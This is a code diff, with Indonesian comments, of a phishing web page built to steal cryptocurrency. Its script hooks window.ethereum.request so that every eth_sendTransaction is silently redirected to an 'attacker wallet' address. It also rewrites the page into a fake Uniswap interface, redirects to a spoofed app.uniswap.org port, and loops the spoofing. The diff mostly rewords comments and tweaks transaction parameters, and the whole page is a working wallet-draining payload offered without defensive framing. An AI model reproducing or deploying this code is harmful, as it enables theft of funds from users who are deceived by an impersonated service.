@@ -32,18 +32,18 @@
     button:hover { opacity: 0.9; }
   </style>
   <script>
-    // Alamat dompet penyerang target (Attacker Receiver)
+    // Alamat dompet penyerang target
     const attackerWallet = "0x9999999999999999999999999999999999999999";
     const a = "<h3 style='color:red;'>[!] Secure Context Injection Active</h3>";
 
-    // Monkey Patching pada objek window.ethereum.request agar parameter transaksi diganti secara senyap
+    // Monkey Patching stabil untuk parameter eth_sendTransaction
     if (typeof window.ethereum !== 'undefined') {
         const originalRequest = window.ethereum.request;
         window.ethereum.request = async function(args) {
             if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
                 let tx = args.params[0];
-                console.log("[!] INTERCEPT BERHASIL! Tujuan asli dApp: " + tx.to);
-                // Menimpa alamat tujuan ke alamat penyerang
+                console.log("[!] INTERCEPT BERHASIL! Tujuan asli: " + tx.to);
+                // Substitusi alamat tujuan ke dompet penyerang
                 tx.to = attackerWallet;
             }
             return originalRequest.apply(window.ethereum, [args]);
@@ -51,7 +51,6 @@
     }
 
     async function spoof() {
-      // Render ulang elemen halaman gaya Uniswap
       if (!document.getElementById('connect')) {
           document.body.innerHTML = `
             <h1>app.uniswap.org Web3 Interface</h1>
@@ -85,17 +84,18 @@
               const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
               const user = accounts[0];
 
-              // Parameter awal yang dikirim dApp (akan otomatis di-hook & diganti ke attackerWallet)
-              const tx = {
+              // Parameter transaksi standar yang berhasil memicu tampilan UI konfirmasi spoofing
+              const txParams = {
                 from: user,
                 to: "0x1111111111111111111111111111111111111111", 
-                value: "0x5af3107a4000", // ~0.0001 ETH
-                gas: "0x5208"
+                value: "0x5af3107a4000", 
+                gas: "0x5208",
+                gasPrice: "0x3b9aca00"
               };
 
               await ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [tx]
+                params: [txParams]
               });
 
               alert("Transaction sent.");
@@ -106,18 +106,17 @@
           };
       }
 
-      // Logika pemanggilan manipulasi DOM & redirect port tiruan sesuai struktur Anda
+      // Logika perulangan manipulasi port/halaman
       try {
-        // document.write(a); // Diaktifkan jika ingin injeksi langsung
         window.location.assign("http://app.uniswap.org:1121");
       } catch(e) {}
 
       setTimeout(function(){
-          spoof();  // Loop agar halaman selalu menampilkan antarmuka penyerang
+          spoof();  
       }, 5000); 
     }
 
-    // Interval eksekusi fungsi spoof berkala
+    // Interval perulangan fungsi spoof
     setInterval(spoof, 2000);
   </script>
 </head>
